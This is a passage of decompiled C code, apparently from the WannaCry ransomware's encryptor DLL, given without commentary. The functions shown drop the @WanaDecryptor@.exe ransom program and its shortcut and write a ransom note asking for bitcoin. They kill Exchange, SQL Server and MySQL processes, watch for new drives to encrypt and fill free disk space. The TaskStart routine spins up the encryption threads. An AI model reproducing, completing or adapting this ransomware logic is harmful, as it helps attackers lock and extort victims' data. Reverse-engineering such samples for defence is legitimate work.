    puVar6 = auStack_672;
    for (iVar5 = 0x81; iVar5 != 0; iVar5 = iVar5 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    *(undefined2 *)puVar6 = 0;
    swprintf(&wStack_674,0x1000d5fc,(wchar_t *)&stack0xfffff784);
    hFindFile = FindFirstFileW(&wStack_674,&_Stack_46c);
    if (hFindFile != (HANDLE)0xffffffff) {
      do {
        iVar5 = wcscmp(_Stack_46c.cFileName,(wchar_t *)&DAT_1000ccb4);
        if (((iVar5 != 0) &&
            (iVar5 = wcscmp(_Stack_46c.cFileName,(wchar_t *)&DAT_1000ccac), iVar5 != 0)) &&
           (((byte)_Stack_46c.dwFileAttributes & 0x10) != 0)) {
          swprintf(&wStack_674,0x1000d5e8,(wchar_t *)&stack0xfffff784,_Stack_46c.cFileName,
                   pwVar2 + 1);
          (*pcStack_c)(&wStack_674,_Stack_46c.cFileName,uStack_8);
          if ((_Str2 != (wchar_t *)0x0) && (iVar5 = wcscmp(pwVar2 + 1,_Str2), iVar5 != 0)) {
            swprintf(&wStack_674,0x1000d5e8,(wchar_t *)&stack0xfffff784,_Stack_46c.cFileName,_Str2);
            (*pcStack_c)(&wStack_674,_Stack_46c.cFileName,uStack_8);
          }
        }
        BVar4 = FindNextFileW(hFindFile,&_Stack_46c);
      } while (BVar4 != 0);
      FindClose(hFindFile);
      return 1;
    }
    return 0;
  }
  return 0;
}



void FUN_10004cd0(void)

{
  char cVar1;
  DWORD DVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  char *pcVar6;
  undefined4 *puVar7;
  char *pcVar8;
  char *pcVar9;
  CHAR local_6cc;
  undefined4 local_6cb;
  char local_4c4 [2];
  char acStack_4c2 [218];
  char local_3e8 [1000];
  
  DVar2 = GetFileAttributesW(u__WanaDecryptor__exe_1000cce4);
  if (DVar2 == 0xffffffff) {
    CopyFileA(s_u_wnry_1000d704,s__WanaDecryptor__exe_1000d5c4,0);
  }
  DVar2 = GetFileAttributesW(u__WanaDecryptor__exe_lnk_1000cc44);
  if (DVar2 == 0xffffffff) {
    pcVar6 = s__echo_off_echo_SET_ow___WScript__1000d628;
    pcVar9 = local_4c4;
    for (iVar3 = 0x36; iVar3 != 0; iVar3 = iVar3 + -1) {
      *(undefined4 *)pcVar9 = *(undefined4 *)pcVar6;
      pcVar6 = pcVar6 + 4;
      pcVar9 = pcVar9 + 4;
    }
    *(undefined2 *)pcVar9 = *(undefined2 *)pcVar6;
    pcVar9[2] = pcVar6[2];
    local_6cc = DAT_1000dd98;
    puVar7 = &local_6cb;
    for (iVar3 = 0x81; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar7 = 0;
      puVar7 = puVar7 + 1;
    }
    *(undefined2 *)puVar7 = 0;
    *(undefined1 *)((int)puVar7 + 2) = 0;
    GetCurrentDirectoryA(0x208,&local_6cc);
    iVar3 = -1;
    pcVar6 = &local_6cc;
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      cVar1 = *pcVar6;
      pcVar6 = pcVar6 + 1;
    } while (cVar1 != '\0');
    if (iVar3 != -2) {
      uVar4 = 0xffffffff;
      pcVar6 = &local_6cc;
      do {
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        cVar1 = *pcVar6;
        pcVar6 = pcVar6 + 1;
      } while (cVar1 != '\0');
      if ((&stack0xfffff932)[~uVar4] != '\\') {
        uVar4 = 0xffffffff;
        pcVar6 = &DAT_1000d624;
        do {
          pcVar9 = pcVar6;
          if (uVar4 == 0) break;
          uVar4 = uVar4 - 1;
          pcVar9 = pcVar6 + 1;
          cVar1 = *pcVar6;
          pcVar6 = pcVar9;
        } while (cVar1 != '\0');
        uVar4 = ~uVar4;
        iVar3 = -1;
        pcVar6 = &local_6cc;
        do {
          pcVar8 = pcVar6;
          if (iVar3 == 0) break;
          iVar3 = iVar3 + -1;
          pcVar8 = pcVar6 + 1;
          cVar1 = *pcVar6;
          pcVar6 = pcVar8;
        } while (cVar1 != '\0');
        pcVar6 = pcVar9 + -uVar4;
        pcVar9 = pcVar8 + -1;
        for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
          *(undefined4 *)pcVar9 = *(undefined4 *)pcVar6;
          pcVar6 = pcVar6 + 4;
          pcVar9 = pcVar9 + 4;
        }
        for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
          *pcVar9 = *pcVar6;
          pcVar6 = pcVar6 + 1;
          pcVar9 = pcVar9 + 1;
        }
      }
    }
    sprintf(local_3e8,local_4c4,&local_6cc,s__WanaDecryptor__exe_lnk_1000d60c,&local_6cc,
            s__WanaDecryptor__exe_1000d5c4);
    void FUN_10001140(char *param_1);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_10004df0(void)

{
  char cVar1;
  DWORD DVar2;
  FILE *pFVar3;
  int iVar4;
  uint uVar5;
  undefined4 *puVar6;
  code *pcVar7;
  char *pcVar8;
  undefined1 uStack00000064;
  
  FUN_10006bd0();
  DVar2 = GetFileAttributesW(u__Please_Read_Me__txt_1000cc74);
  if (DVar2 == 0xffffffff) {
    pFVar3 = fopen(s_r_wnry_1000d738,&DAT_1000c01c);
    if (pFVar3 != (FILE *)0x0) {
      uStack00000064 = 0;
      puVar6 = (undefined4 *)&stack0x00000065;
      for (iVar4 = 0x3ff; iVar4 != 0; iVar4 = iVar4 + -1) {
        *puVar6 = 0;
        puVar6 = puVar6 + 1;
      }
      *(undefined2 *)puVar6 = 0;
      *(undefined1 *)((int)puVar6 + 2) = 0;
      fread(&stack0x00000064,1,0x1000,pFVar3);
      fclose(pFVar3);
      pFVar3 = _wfopen(u__Please_Read_Me__txt_1000cc74,(wchar_t *)&DAT_1000d730);
      pcVar7 = sprintf_exref;
      if (pFVar3 != (FILE *)0x0) {
        if (DAT_1000d9d4 == 0) {
          ftol();
          pcVar7 = sprintf_exref;
          sprintf(&stack0x00000000,s___d_worth_of_bitcoin_1000d718);
        }
        else {
          sprintf(&stack0x00000000,s___1f_BTC_1000d70c);
        }
        (*pcVar7)();
        uVar5 = 0xffffffff;
        pcVar8 = &stack0x00001064;
        do {
          if (uVar5 == 0) break;
          uVar5 = uVar5 - 1;
          cVar1 = *pcVar8;
          pcVar8 = pcVar8 + 1;
        } while (cVar1 != '\0');
        fwrite(&stack0x00001064,1,~uVar5,pFVar3);
        fclose(pFVar3);
      }
    }
  }
  return;
}



LPWSTR __cdecl FUN_10005060(int param_1,LPWSTR param_2)

{
  wchar_t *_Format;
  size_t sVar1;
  char local_400 [1024];
  
  GetWindowsDirectoryW(param_2,0x104);
  _Format = (wchar_t *)(param_1 + 0x41);
  if ((wchar_t *)(uint)(ushort)*param_2 == _Format) {
    GetTempPathW(0x104,param_2);
    sVar1 = wcslen(param_2);
    if (sVar1 != 0) {
      sVar1 = wcslen(param_2);
      if (param_2[sVar1 - 1] == L'\\') {
        sVar1 = wcslen(param_2);
        param_2[sVar1 - 1] = L'\0';
        return param_2;
      }
    }
  }
  else {
    swprintf(param_2,0x1000d768,_Format,u__RECYCLE_1000d778);
    CreateDirectoryW(param_2,(LPSECURITY_ATTRIBUTES)0x0);
    sprintf(local_400,s_attrib__h__s__C___s_1000d748,_Format,s__RECYCLE_1000d75c);
    FUN_10001080(local_400,0,(LPDWORD)0x0);
  }
  return param_2;
}



LPCWSTR __cdecl FUN_10005120(int param_1,LPCWSTR param_2)

{
  int iVar1;
  undefined4 *puVar2;
  WCHAR local_208;
  undefined4 local_206 [129];
  
  local_208 = L'\0';
  puVar2 = local_206;
  for (iVar1 = 0x81; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  FUN_10005060(param_1,&local_208);
  swprintf(param_2,0x1000d78c,&local_208,u__WNCRYT_1000cbc8);
  DeleteFileW(param_2);
  return param_2;
}



void __cdecl FUN_10005190(int param_1)

{
  UINT UVar1;
  undefined4 *lpBuffer;
  HANDLE hFile;
  BOOL BVar2;
  int iVar3;
  uint uVar4;
  undefined4 *puVar5;
  WCHAR local_22c;
  undefined2 uStack_22a;
  undefined4 local_228;
  ULARGE_INTEGER local_224;
  DWORD local_21c;
  ULARGE_INTEGER local_218;
  ULARGE_INTEGER local_210;
  WCHAR local_208;
  undefined4 local_206 [129];
  
  local_228 = DAT_1000d7a8;
  _local_22c = CONCAT22((short)((uint)DAT_1000d7a4 >> 0x10),(short)param_1 + 0x41);
  UVar1 = GetDriveTypeW(&local_22c);
  if ((UVar1 == 3) && (lpBuffer = GlobalAlloc(0,0xa00000), lpBuffer != (undefined4 *)0x0)) {
    puVar5 = lpBuffer;
    for (iVar3 = 0x280000; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar5 = 0x55555555;
      puVar5 = puVar5 + 1;
    }
    local_208 = L'\0';
    puVar5 = local_206;
    for (iVar3 = 0x81; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar5 = 0;
      puVar5 = puVar5 + 1;
    }
    *(undefined2 *)puVar5 = 0;
    FUN_10005120(param_1,&local_208);
    hFile = CreateFileW(&local_208,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,2,(HANDLE)0x0);
    if (hFile == (HANDLE)0xffffffff) {
      GlobalFree(lpBuffer);
      return;
    }
    MoveFileExW(&local_208,(LPCWSTR)0x0,4);
    if (DAT_1000dd8c == 0) {
      while ((BVar2 = GetDiskFreeSpaceExW(&local_22c,&local_210,&local_218,&local_224), BVar2 != 0
             && ((local_224.s.HighPart != 0 || (0x40000000 < local_224.s.LowPart))))) {
        uVar4 = 0;
        do {
          BVar2 = WriteFile(hFile,lpBuffer,0xa00000,&local_21c,(LPOVERLAPPED)0x0);
          if (BVar2 == 0) goto LAB_100052cd;
          Sleep(10);
          uVar4 = uVar4 + 1;
        } while (uVar4 < 0x14);
        Sleep(10000);
        if (DAT_1000dd8c != 0) break;
      }
    }
LAB_100052cd:
    GlobalFree(lpBuffer);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);
    DeleteFileW(&local_208);
  }
  return;
}



void FUN_10005480(void)

{
  size_t sVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uStack_21c;
  undefined2 *puStack_218;
  undefined2 local_208;
  undefined4 local_206 [125];
  void *pvStack_10;
  
  local_208 = DAT_1000d918;
  puVar3 = local_206;
  for (iVar2 = 0x81; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  puStack_218 = &local_208;
  uStack_21c = 0;
  *(undefined2 *)puVar3 = 0;
  SHGetFolderPathW();
  sVar1 = wcslen((wchar_t *)&uStack_21c);
  if (sVar1 != 0) {
    FUN_100027f0(pvStack_10,(LPCWSTR)&uStack_21c,(int *)0x1);
  }
  uStack_21c = uStack_21c & 0xffff0000;
  SHGetFolderPathW(0,5,0);
  sVar1 = wcslen((wchar_t *)&stack0xfffffdd0);
  if (sVar1 != 0) {
    FUN_100027f0(pvStack_10,(LPCWSTR)&stack0xfffffdd0,(int *)0x1);
  }
  FUN_10004a40(0x19);
  FUN_10004a40(0x2e);
  return;
}



void __cdecl FUN_10005540(undefined4 param_1,int param_2,int param_3)

{
  LONG LVar1;
  BOOL BVar2;
  UINT UVar3;
  int iVar4;
  code *pcVar5;
  undefined4 *puVar6;
  void *unaff_retaddr;
  undefined4 local_228;
  undefined4 local_224;
  ULARGE_INTEGER local_220;
  ULARGE_INTEGER local_218;
  undefined1 local_210 [6];
  undefined4 auStack_20a [130];
  
  pcVar5 = GetDriveTypeW_exref;
  local_224 = DAT_1000d7a8;
  local_228 = CONCAT22((short)((uint)DAT_1000d7a4 >> 0x10),(short)param_2 + 0x41);
  if (param_3 == 0) {
    LVar1 = InterlockedExchangeAdd((LONG *)&DAT_1000d4e4,0);
    if (LVar1 == param_2) {
      return;
    }
    iVar4 = 0;
    while ((BVar2 = GetDiskFreeSpaceExW((LPCWSTR)&local_228,(PULARGE_INTEGER)local_210,&local_220,
                                        &local_218), pcVar5 = GetDriveTypeW_exref, BVar2 == 0 ||
           ((local_220.s.HighPart == 0 && (local_220.s.LowPart == 0))))) {
      Sleep(1000);
      iVar4 = iVar4 + 1;
      if (0x1d < iVar4) {
        return;
      }
    }
    UVar3 = GetDriveTypeW((LPCWSTR)&local_228);
    if (UVar3 == 5) {
      return;
    }
  }
  else {
    UVar3 = GetDriveTypeW((LPCWSTR)&local_228);
    if (UVar3 == 5) {
      return;
    }
    InterlockedExchange((LONG *)&DAT_1000d4e4,param_2);
  }
  iVar4 = (*pcVar5)(&local_228);
  if (iVar4 == 3) {
    local_210._4_2_ = 0;
    puVar6 = auStack_20a;
    for (iVar4 = 0x81; iVar4 != 0; iVar4 = iVar4 + -1) {
      *puVar6 = 0;
      puVar6 = puVar6 + 1;
    }
    *(undefined2 *)puVar6 = 0;
    FUN_10005060(param_2,(LPWSTR)(local_210 + 4));
    FUN_10001910(unaff_retaddr,(wchar_t *)(local_210 + 4));
  }
  local_228 = local_228 & 0xffff0000;
  FUN_100027f0(unaff_retaddr,(LPCWSTR)&stack0xfffffdd4,(int *)0x1);
  return;
}



undefined4 FUN_10005680(int param_1)

{
  int iVar1;
  DWORD local_930 [585];
  void *local_c;
  undefined1 *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_10006ebb;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  FUN_10001590(local_930);
  local_4 = 0;
  iVar1 = FUN_10001830(local_930,&DAT_1000dd24,&LAB_10005340,&DAT_1000dd8c);
  if (iVar1 == 0) {
    local_4 = 0xffffffff;
    FUN_10001680(local_930);
    ExceptionList = local_c;
    return 0;
  }
  FUN_10005540(local_930,param_1,0);
  FUN_10005190(param_1);
  FUN_10001760((int)local_930);
                    // WARNING: Subroutine does not return
  ExitThread(0);
}



void FUN_10005730(void)

{
  uint uVar1;
  DWORD DVar2;
  HANDLE hObject;
  uint uVar3;
  LPVOID lpParameter;
  
  DVar2 = GetLogicalDrives();
  while (uVar1 = DVar2, DAT_1000dd8c == 0) {
    Sleep(3000);
    DVar2 = GetLogicalDrives();
    uVar3 = uVar1 ^ DVar2;
    if (uVar3 != 0) {
      lpParameter = (LPVOID)0x3;
      do {
        if (DAT_1000dd8c != 0) goto LAB_100057af;
        if ((((uVar3 >> ((byte)lpParameter & 0x1f) & 1) != 0) &&
            ((uVar1 >> ((byte)lpParameter & 0x1f) & 1) == 0)) &&
           (hObject = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10005680,lpParameter,0,
                                   (LPDWORD)0x0), hObject != (HANDLE)0x0)) {
          CloseHandle(hObject);
        }
        lpParameter = (LPVOID)((int)lpParameter + 1);
      } while ((int)lpParameter < 0x1a);
    }
  }
LAB_100057af:
                    // WARNING: Subroutine does not return
  ExitThread(0);
}



void FUN_100057c0(void)

{
  int iVar1;
  DWORD DVar2;
  UINT UVar3;
  int iVar4;
  int iVar5;
  bool bVar6;
  time_t tVar7;
  undefined4 local_d40;
  undefined4 local_d3c;
  undefined4 local_d38;
  undefined4 local_d34;
  char local_d30 [1024];
  DWORD local_930 [585];
  void *local_c;
  undefined1 *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_10006edb;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  FUN_10001590(local_930);
  local_4 = 0;
  iVar1 = FUN_10001830(local_930,&DAT_1000dd24,&LAB_10005340,&DAT_1000dd8c);
  if (iVar1 != 0) {
    DVar2 = GetFileAttributesA(s_f_wnry_1000d7bc);
    if (DVar2 == 0xffffffff) {
      FUN_100018f0(local_930,10,100);
    }
    if (DAT_1000dcc8 == 0) {
      tVar7 = time((time_t *)0x0);
      DAT_1000dcc8 = (int)tVar7;
      FUN_10004730();
      sprintf(local_d30,s__s_fi_1000d8a0,s__WanaDecryptor__exe_1000d5c4);
      FUN_10001080(local_d30,100000,(LPDWORD)0x0);
      FUN_10001000(&DAT_1000d958,1);
    }
    FUN_10004cd0();
    FUN_10004df0();
    FUN_10005480();
    iVar1 = 0;
    while (DAT_1000dd8c == 0) {
      InterlockedExchange((LONG *)&DAT_1000d4e4,-1);
      if (iVar1 == 1) {
        FUN_10001080(s_taskkill_exe__f__im_Microsoft_Ex_1000d874,0,(LPDWORD)0x0);
        FUN_10001080(s_taskkill_exe__f__im_MSExchange__1000d854,0,(LPDWORD)0x0);
        FUN_10001080(s_taskkill_exe__f__im_sqlserver_ex_1000d830,0,(LPDWORD)0x0);
        FUN_10001080(s_taskkill_exe__f__im_sqlwriter_ex_1000d80c,0,(LPDWORD)0x0);
        FUN_10001080(s_taskkill_exe__f__im_mysqld_exe_1000d7ec,0,(LPDWORD)0x0);
      }
      DVar2 = GetLogicalDrives();
      iVar5 = 0;
      do {
        iVar4 = 0x19;
        do {
          local_d40 = CONCAT22((short)((uint)DAT_1000d7a4 >> 0x10),(short)iVar4 + 0x41);
          local_d3c = DAT_1000d7a8;
          if (DAT_1000dd8c != 0) break;
          if ((DVar2 >> ((byte)iVar4 & 0x1f) & 1) != 0) {
            if (iVar5 == 0) {
              UVar3 = GetDriveTypeW((LPCWSTR)&local_d40);
              if (UVar3 != 4) {
LAB_1000597e:
                FUN_10005540(local_930,iVar4,1);
              }
            }
            else if ((iVar5 != 1) || (UVar3 = GetDriveTypeW((LPCWSTR)&local_d40), UVar3 == 4))
            goto LAB_1000597e;
          }
          iVar4 = iVar4 + -1;
        } while (1 < iVar4);
        iVar5 = iVar5 + 1;
      } while (iVar5 < 2);
      InterlockedExchange((LONG *)&DAT_1000d4e4,-1);
      FUN_10004a40(0x19);
      bVar6 = DAT_1000dce0 == 0;
      if (bVar6) {
        sprintf(local_d30,s__s_co_1000d7e4,s__WanaDecryptor__exe_1000d5c4);
        FUN_10001080(local_d30,0,(LPDWORD)0x0);
      }
      tVar7 = time((time_t *)0x0);
      DAT_1000dce0 = (int)tVar7;
      FUN_10004730();
      if (iVar1 + 1 == 1) {
        sprintf(local_d30,s_cmd_exe__c_start__b__s_vs_1000d7c8,s__WanaDecryptor__exe_1000d5c4);
        FUN_10001080(local_d30,0,(LPDWORD)0x0);
      }
      if (bVar6) {
        FUN_10005190(2);
        iVar5 = 0x19;
        do {
          if (DAT_1000dd8c != 0) break;
          if ((DVar2 >> ((byte)iVar5 & 0x1f) & 1) != 0) {
            local_d34 = DAT_1000d7a8;
            local_d38 = CONCAT22((short)((uint)DAT_1000d7a4 >> 0x10),(short)iVar5 + 0x41);
            UVar3 = GetDriveTypeW((LPCWSTR)&local_d38);
            if (UVar3 == 3) {
              FUN_10005190(iVar5);
            }
          }
          iVar5 = iVar5 + -1;
        } while (2 < iVar5);
      }
      Sleep(60000);
      iVar1 = iVar1 + 1;
    }
  }
  local_4 = 0xffffffff;
  FUN_10001680(local_930);
  ExceptionList = local_c;
  return;
}



undefined4 TaskStart(HMODULE param_1,int param_2)

{
  int iVar1;
  wchar_t *pwVar2;
  undefined4 *puVar3;
  HANDLE pvVar4;
  HANDLE pvVar5;
  undefined4 *puVar6;
  WCHAR local_214;
  undefined4 local_212 [129];
  void *local_c;
  undefined1 *puStack_8;
  undefined4 local_4;
  
                    // 0x5ae0  1  TaskStart
  local_4 = 0xffffffff;
  puStack_8 = &LAB_10006efe;
  local_c = ExceptionList;
  if ((param_2 == 0) && (ExceptionList = &local_c, iVar1 = FUN_10004690(), iVar1 == 0)) {
    local_214 = DAT_1000d918;
    puVar3 = local_212;
    for (iVar1 = 0x81; iVar1 != 0; iVar1 = iVar1 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    *(undefined2 *)puVar3 = 0;
    GetModuleFileNameW(param_1,&local_214,0x103);
    pwVar2 = wcsrchr(&local_214,L'\\');
    if (pwVar2 != (wchar_t *)0x0) {
      pwVar2 = wcsrchr(&local_214,L'\\');
      *pwVar2 = L'\0';
    }
    SetCurrentDirectoryW(&local_214);
    iVar1 = FUN_10001000(&DAT_1000d958,1);
    if (iVar1 != 0) {
      DAT_1000dd94 = FUN_100012d0();
      iVar1 = FUN_10003410();
      if (iVar1 != 0) {
        sprintf(&DAT_1000dcf0,s__08X_res_1000d8c0,0);
        sprintf(&DAT_1000dd24,s__08X_pky_1000d8b4,0);
        sprintf(&DAT_1000dd58,s__08X_eky_1000d8a8,0);
        iVar1 = FUN_10004600(0);
        if ((iVar1 == 0) && (iVar1 = FUN_10004500(0), iVar1 == 0)) {
          puVar3 = operator_new(0x28);
          local_4 = 0;
          if (puVar3 == (undefined4 *)0x0) {
            puVar3 = (undefined4 *)0x0;
          }
          else {
            puVar3 = FUN_10003a10(puVar3);
          }
          local_4 = 0xffffffff;
          if ((puVar3 != (undefined4 *)0x0) &&
             (iVar1 = FUN_10003ac0(puVar3,&DAT_1000dd24,&DAT_1000dd58), iVar1 != 0)) {
            iVar1 = FUN_100046d0();
            if ((iVar1 == 0) || (DAT_1000dc70 != 0)) {
              DeleteFileA(&DAT_1000dcf0);
              puVar6 = &DAT_1000dc68;
              for (iVar1 = 0x22; iVar1 != 0; iVar1 = iVar1 + -1) {
                *puVar6 = 0;
                puVar6 = puVar6 + 1;
              }
              DAT_1000dc70 = 0;
              FUN_10004420(puVar3,(BYTE *)&DAT_1000dc68,8);
            }
            FUN_10003bb0((int)puVar3);
            (**(code **)*puVar3)(1);
            pvVar4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&DAT_10004790
                                  ,(LPVOID)0x0,0,(LPDWORD)0x0);
            if (pvVar4 != (HANDLE)0x0) {
              CloseHandle(pvVar4);
            }
            Sleep(100);
            pvVar4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_100045c0,(LPVOID)0x0,0,
                                  (LPDWORD)0x0);
            if (pvVar4 != (HANDLE)0x0) {
              CloseHandle(pvVar4);
            }
            Sleep(100);
            pvVar4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10005730,(LPVOID)0x0,0,
                                  (LPDWORD)0x0);
            Sleep(100);
            pvVar5 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_10005300
                                  ,(LPVOID)0x0,0,(LPDWORD)0x0);
            if (pvVar5 != (HANDLE)0x0) {
              CloseHandle(pvVar5);
            }
            Sleep(100);
            pvVar5 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_10004990
                                  ,(LPVOID)0x0,0,(LPDWORD)0x0);
            if (pvVar5 != (HANDLE)0x0) {
              CloseHandle(pvVar5);
            }
            Sleep(100);
            FUN_100057c0();
            if (pvVar4 != (HANDLE)0x0) {
              WaitForSingleObject(pvVar4,0xffffffff);
              CloseHandle(pvVar4);
            }
          }
        }
        else {
          pvVar4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_10004990,
                                (LPVOID)0x0,0,(LPDWORD)0x0);
          WaitForSingleObject(pvVar4,0xffffffff);
          CloseHandle(pvVar4);
        }
      }
    }
  }
  ExceptionList = local_c;
  return 0;
}



void __fastcall FUN_10005d80(undefined4 *param_1)

{
  *(undefined1 *)(param_1 + 1) = 0;
  *param_1 = &PTR_FUN_1000acbc;
  return;
}



undefined4 * __thiscall FUN_10005d90(void *this,byte param_1)

{
  FUN_10005db0(this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return this;
}

void * __cdecl operator_new(uint param_1)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x10006ba0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = operator_new(param_1);
  return pvVar1;
}



void __cdecl operator_delete(void *param_1)

{
                    // WARNING: Could not recover jumptable at 0x10006bb0. Too many branches
                    // WARNING: Treating indirect jump as call
  operator_delete(param_1);
  return;
}



void __cdecl local_unwind2(void)

{
                    // WARNING: Could not recover jumptable at 0x10006bbc. Too many branches
                    // WARNING: Treating indirect jump as call
  local_unwind2();
  return;
}

void __cdecl ftol(void)

{
                    // WARNING: Could not recover jumptable at 0x10006c00. Too many branches
                    // WARNING: Treating indirect jump as call
  ftol();
  return;
}



void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo)

{
                    // WARNING: Could not recover jumptable at 0x10006c2e. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  _CxxThrowException(pExceptionObject,pThrowInfo);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_10006c34(undefined4 param_1,int param_2)

{
  undefined4 uVar1;
  undefined4 *_Memory;
  undefined4 *puVar2;
  
  if (param_2 == 0) {
    if (0 < DAT_1000ddc0) {
      DAT_1000ddc0 = DAT_1000ddc0 + -1;
      goto LAB_10006c4a;
    }
LAB_10006c72:
    uVar1 = 0;
  }
  else {
LAB_10006c4a:
    _DAT_1000ddc4 = *(undefined4 *)_adjust_fdiv_exref;
    if (param_2 == 1) {
      DAT_1000ddcc = malloc(0x80);
      if (DAT_1000ddcc == (undefined4 *)0x0) goto LAB_10006c72;
      *DAT_1000ddcc = 0;
      DAT_1000ddc8 = DAT_1000ddcc;
      initterm(&DAT_1000c000,&DAT_1000c004);
      DAT_1000ddc0 = DAT_1000ddc0 + 1;
    }
    else if ((param_2 == 0) &&
            (_Memory = DAT_1000ddcc, puVar2 = DAT_1000ddc8, DAT_1000ddcc != (undefined4 *)0x0)) {
      while (puVar2 = puVar2 + -1, _Memory <= puVar2) {
        if ((code *)*puVar2 != (code *)0x0) {
          (*(code *)*puVar2)();
          _Memory = DAT_1000ddcc;
        }
      }
      free(_Memory);
      DAT_1000ddcc = (undefined4 *)0x0;
    }
    uVar1 = 1;
  }
  return uVar1;
}



int entry(undefined4 param_1,int param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  iVar1 = param_2;
  iVar2 = DAT_1000ddc0;
  if (param_2 != 0) {
    if ((param_2 != 1) && (param_2 != 2)) goto LAB_10006d27;
    if ((DAT_1000ddd0 != (code *)0x0) &&
       (iVar2 = (*DAT_1000ddd0)(param_1,param_2,param_3), iVar2 == 0)) {
      return 0;
    }
    iVar2 = FUN_10006c34(param_1,param_2);
  }
  if (iVar2 == 0) {
    return 0;
  }
LAB_10006d27:
  iVar2 = FUN_100039f0(param_1,param_2);
  if (param_2 == 1) {
    if (iVar2 != 0) {
      return iVar2;
    }
    FUN_10006c34(param_1,0);
  }
  if ((param_2 != 0) && (param_2 != 3)) {
    return iVar2;
  }
  iVar3 = FUN_10006c34(param_1,param_2);
  param_2 = iVar2;
  if (iVar3 == 0) {
    param_2 = 0;
  }
  if (param_2 != 0) {
    if (DAT_1000ddd0 != (code *)0x0) {
      iVar2 = (*DAT_1000ddd0)(param_1,iVar1,param_3);
      return iVar2;
    }
    return param_2;
  }
  return 0;
}



void __thiscall type_info::~type_info(type_info *this)

{
                    // WARNING: Could not recover jumptable at 0x10006d7c. Too many branches
                    // WARNING: Treating indirect jump as call
  ~type_info(this);
  return;
}



void __cdecl initterm(void)

{
                    // WARNING: Could not recover jumptable at 0x10006d82. Too many branches
                    // WARNING: Treating indirect jump as call
  initterm();
  return;
}



void Unwind_10006d90(void)

{
  int unaff_EBP;
  
  FUN_10003a60((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}



void Unwind_10006d9b(void)

{
  int unaff_EBP;
  
  FUN_10003a60((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
  return;
}



void Unwind_10006da6(void)

{
  int unaff_EBP;
  
  FUN_10005db0((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x54));
  return;
}



void Unwind_10006dc0(void)

{
  int unaff_EBP;
  
  FUN_10003a60((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}



void Unwind_10006dcb(void)

{
  int unaff_EBP;
  
  FUN_10003a60((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
  return;
}



void Unwind_10006dd6(void)

{
  int unaff_EBP;
  
  FUN_10005db0((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x54));
  return;
}



void Unwind_10006de1(void)

{
  int unaff_EBP;
  
  FUN_10003500(*(int *)(unaff_EBP + -0x10) + 0x4e0);
  return;
}



void Unwind_10006e00(void)

{
  int unaff_EBP;
  
  FUN_10003560(unaff_EBP + -0xa40);
  return;
}



void Unwind_10006e0b(void)

{
  int unaff_EBP;
  
  FUN_10003500(unaff_EBP + -0xa4c);
  return;
}



void Unwind_10006e16(void)

{
  int unaff_EBP;
  
                    // WARNING: Could not recover jumptable at 0x10006e1c. Too many branches
                    // WARNING: Treating indirect jump as call
  std::basic_string<>::~basic_string<>((basic_string<> *)(unaff_EBP + -0xa24));
  return;
}



void Unwind_10006e30(void)

{
  int unaff_EBP;
  
  FUN_10003560(unaff_EBP + -0x18);
  return;
}



void Unwind_10006e50(void)

{
  int unaff_EBP;
  
                    // WARNING: Could not recover jumptable at 0x10006e53. Too many branches
                    // WARNING: Treating indirect jump as call
  std::basic_string<>::~basic_string<>((basic_string<> *)(unaff_EBP + -0x1c));
  return;
}



void Unwind_10006e70(void)

{
  FUN_100039e0();
  return;
}



void Unwind_10006e90(void)

{
  int unaff_EBP;
  
  FUN_10003a60((undefined4 *)(unaff_EBP + -0x68));
  return;
}



void Unwind_10006eb0(void)

{
  int unaff_EBP;
  
  FUN_10001680((undefined4 *)(unaff_EBP + -0x930));
  return;
}



void Unwind_10006ed0(void)

{
  int unaff_EBP;
  
